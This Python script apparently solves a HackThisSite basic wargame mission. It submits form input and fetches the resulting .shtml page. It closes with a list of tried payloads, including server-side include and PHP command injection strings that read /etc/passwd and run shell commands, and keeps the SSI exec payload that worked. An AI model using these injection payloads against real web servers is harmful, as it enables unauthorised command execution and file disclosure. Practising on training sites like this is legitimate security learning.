from zipfile import ZipFile
from tarfile import *
import tarfile
import lzma
import urllib
import requests
import re
import sys
inputa = input("Digite o INPUT => ")
url = "https://www.hackthissite.org/missions/basic/8/level8/php"
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win86; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3396.0 Safari/537.36",\
            "referer":"https://www.hackthissite.org/missions/basic/8/"}
cookie= {"PHPSESSID" :"qp6a0l09g5nkfhaqmse48ubib6"}



session = requests.Session()

r = session.post(url, cookies=cookie, headers=headers , data={"name":inputa,"submit":'submit'}, allow_redirects=1)

contento = r.text

if "Your file has been saved. Please click" in contento:
    print(contento)
    url_novo = re.findall(r"tmp/.+shtml", contento)
    url = "https://www.hackthissite.org/missions/basic/8/"
    url_novo =url+"".join(url_novo)
    print(url_novo)
else:
    print(contento+"\n\n")
    sys.exit()

r = session.post(url_novo, cookies=cookie, headers=headers , data={"name":"name","submit":'submit'}, allow_redirects=1)

contento = r.text
print(contento)




inputs_que_tentei_O_ULTIMO_FUNCIONOU = ['<!--include virtual="../../../../../../etc/passwd" -->','<?php system("ls -la")?>','<!-- <?php system("ls /var/www/hackthissite.org/html/missions/basic/8/")?>-->',"<!-- cat level8.html -->"," <pre><!--#exec cmd='ls'--></pre>"]

CODIGO_QUE_FUNCIONOU = '<pre><!--#exec cmd="cat ../au12ha39vc.php"--></pre>'
